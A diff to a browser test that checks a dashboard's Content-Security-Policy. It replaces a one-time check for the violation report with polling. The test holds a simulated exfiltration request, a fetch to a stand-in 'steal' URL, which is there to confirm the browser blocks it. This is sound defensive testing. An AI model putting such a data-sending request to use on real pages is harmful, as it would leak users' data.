@@ -138,5 +138,7 @@ test('the dashboard has a Content-Security-Policy, shows no violations in normal
   // A request to any other site is refused by the browser itself.
   const result = await page.evaluate(() => fetch('https://example.org/steal?x=1').then(() => 'sent', () => 'blocked'));
   expect(result).toBe('blocked');
-  expect(violations.some(v => v.startsWith('connect-src') && v.includes('example.org'))).toBe(true);
+  // The browser reports the violation as a separate event that can arrive just after the
+  // refused request settles, so wait for it (up to 5 s) instead of checking only once.
+  await expect.poll(() => violations.some(v => v.startsWith('connect-src') && v.includes('example.org')), { timeout: 5000 }).toBe(true);
 });
